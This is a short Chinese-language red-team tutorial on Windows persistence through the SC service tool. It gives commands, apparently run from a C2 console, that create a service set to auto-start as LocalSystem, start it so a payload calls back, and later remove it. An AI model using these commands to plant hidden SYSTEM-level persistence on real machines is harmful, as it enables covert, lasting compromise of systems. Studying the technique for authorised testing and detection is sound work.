### Windows SC 服务权限维持

Windows 服务是一种特殊的程序，它可以在系统启动时自动运行，即使没有用户登录。`SC` 命令是 Windows 命令行工具，用于管理这些服务

利用 SC 服务进行权限维持，主要利用了以下几个特性：

1. **自动启动**：服务可以被设置为在系统启动时自动运行，而无需依赖用户的登录
2. **高权限**：服务可以被配置为以 **`SYSTEM`**、`LocalService` 或 `NetworkService` 等高权限账户运行，从而获得对系统的深度控制
3. **隐蔽性**：服务通常在后台运行，没有用户界面，不易被普通用户察觉

创建服务

```cmd
shell sc create pentestlab binpath= "C:\e.exe" start= auto obj= "LocalSystem"
```

`sc create`: 这是命令的核心，它告诉 Windows 服务控制管理器去**创建一个新服务**

`pentestlab`: 这是你给服务指定的**名称**

`binpath=`: 这是服务的**可执行文件路径**

`start=`: 这是服务的**启动类型**。`auto` 表示该服务将在系统启动时**自动运行**，无需用户干预

`obj=`: 这是服务将**以哪个账户运行**。`LocalSystem` 是一个特殊的内置账户，它拥有**本地计算机的最高权限**，相当于 `NT AUTHORITY\SYSTEM`

![](https://pic1.imgdb.cn/item/68d5f349c5157e1a88333cd7.png)

启动服务

```cmd
sc start pentestlab
```

![](https://pic1.imgdb.cn/item/68d5f3bac5157e1a88334513.png)

已经上线

![](https://pic1.imgdb.cn/item/68d5f3e2c5157e1a8833484a.png)

移除服务

```cmd
shell sc stop pentestlab
shell sc delete pentestlab
```

